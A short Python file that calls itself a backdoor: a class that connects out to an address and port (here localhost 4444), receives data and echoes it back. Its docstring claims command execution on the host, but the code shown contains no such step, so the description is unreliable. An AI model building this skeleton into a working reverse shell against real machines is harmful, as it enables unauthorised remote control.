"""
backdoor.py

Author: Sam Hilliard

When executed, opens a connection to a specified
address and port. Once connected, used to execute
commands on the host machine.
"""

import socket

class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def recieve_data(self):
        return self.connection.recv(1024)

    def send_data(self, data):
        return self.connection.send(data)


def main():
    backdoor = Backdoor('127.0.0.1', 4444)

    data = backdoor.recieve_data()
    backdoor.send_data(data)

    backdoor.connection.close()

if __name__ == '__main__':
    main()